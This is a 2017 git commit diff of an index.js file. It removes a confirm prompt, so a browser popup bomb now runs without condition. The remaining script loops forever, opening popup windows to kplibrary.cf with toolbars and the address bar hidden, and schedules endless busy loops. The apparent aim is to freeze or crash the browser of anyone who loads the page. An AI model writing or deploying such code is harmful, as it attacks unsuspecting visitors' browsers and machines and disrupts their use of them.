03a364a22ad29c44001722de49087ca46e3c2cee
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 15:41:57 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,3 @@
-var answer = confirm ("Are you a kp student")
-if (answer)
 while(true)
 {
 window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
@@ -7,13 +5,3 @@ setTimeout(function(){
 for(var i = 0; i === i; i++) {}
 }, 50); 
 }
-else
-while(true)
-{
-window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
-setTimeout(function(){
-for(var i = 0; i === i; i++) {}
-}, 50); 
-}
-
-
